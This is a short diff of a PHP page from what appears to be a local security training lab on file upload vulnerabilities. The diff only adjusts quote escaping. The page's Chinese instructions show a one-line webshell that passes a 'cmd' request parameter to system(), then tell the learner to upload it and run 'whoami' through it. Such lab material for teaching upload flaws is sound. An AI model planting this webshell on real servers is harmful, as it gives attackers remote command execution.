@@ -79,7 +79,7 @@ $content = '<div class="card">
                         <li>创建一个PHP恶意文件，例如：</li>
                         <pre class="bg-dark text-light p-3 rounded"><code>&lt;?php
 // webshell.php
-system($_GET['cmd']);
+system($_GET[&#39;cmd&#39;]);
 ?&gt;</code></pre>
                         <li>通过下方表单上传该文件</li>
                         <li>访问上传后的文件，例如：<code>http://localhost/zhaosec/upload/uploads/webshell.php?cmd=whoami</code></li>
